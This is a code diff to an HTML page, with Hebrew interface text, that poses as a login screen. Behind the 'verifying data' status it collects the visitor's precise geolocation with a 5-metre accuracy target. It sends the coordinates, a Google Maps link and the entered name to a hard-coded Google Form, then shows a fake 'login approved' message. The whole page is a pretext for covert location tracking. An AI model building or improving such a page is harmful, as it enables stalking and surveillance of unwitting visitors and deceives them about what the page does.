@@ -19,55 +19,53 @@
     <script>
         window.onload = function() {
             const userName = prompt("הכנס שם משתמש לכניסה:");
-            if (!userName) return;
+            if (!userName || userName.trim() === "") {
+                document.getElementById("status").innerText = "גישה נדחתה.";
+                return;
+            }
 
             document.getElementById("status").innerText = "מאמת נתונים...";
 
             let hasSent = false;
             let bestPosition = null;
 
-            async function sendToGoogle(pos, name) {
+            function sendToGoogle(pos, name) {
                 if (hasSent) return;
                 hasSent = true;
 
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 
-                // הקישור המדויק ביותר ל-Google Maps
+                // יצירת הקישור הישיר והנקי ל-Google Maps
                 const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                
-                let addressDesc = "";
-                try {
-                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`, {
-                        headers: { 'Accept-Language': 'he' }
-                    });
-                    const d = await r.json();
-                    addressDesc = (d.display_name || "כתובת כללית") + " | לצפייה במפה: " + mapsLink;
-                } catch (e) {
-                    addressDesc = "מיקום מדויק: " + mapsLink;
-                }
 
                 const formID = "1FAIpQLSfYA2SsnyuwYFOhz_IjWdfLAkudHUJPBWmS3VUoF-8xp5u6Gw";
                 const url = `https://docs.google.com/forms/d/e/${formID}/formResponse` +
                     `?entry.1905099702=${lat}` +
                     `&entry.379601602=${lon}` +
-                    `&entry.1378939865=${encodeURIComponent(addressDesc)}` +
+                    `&entry.1378939865=${encodeURIComponent(mapsLink)}` + // שדה 4 מקבל רק קישור
                     `&entry.2102560173=${encodeURIComponent(name)}` +
                     `&submit=Submit`;
 
+                // שליחה מהירה
                 fetch(url, { mode: 'no-cors' });
+                
                 document.getElementById("status").innerText = "נכנסת בהצלחה!";
                 setTimeout(() => { alert("שלום " + name + ", הכניסה אושרה."); }, 500);
             }
 
             const watchID = navigator.geolocation.watchPosition((pos) => {
                 bestPosition = pos;
+                // סף דיוק של 5 מטרים
                 if (pos.coords.accuracy <= 5) {
                     navigator.geolocation.clearWatch(watchID);
                     sendToGoogle(pos, userName);
                 }
-            }, null, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+            }, (err) => {
+                console.log(err);
+            }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
 
+            // אם אחרי 10 שניות לא הגענו ל-5 מטר, שלח את הכי טוב שיש
             setTimeout(() => {
                 if (!hasSent && bestPosition) {
                     navigator.geolocation.clearWatch(watchID);
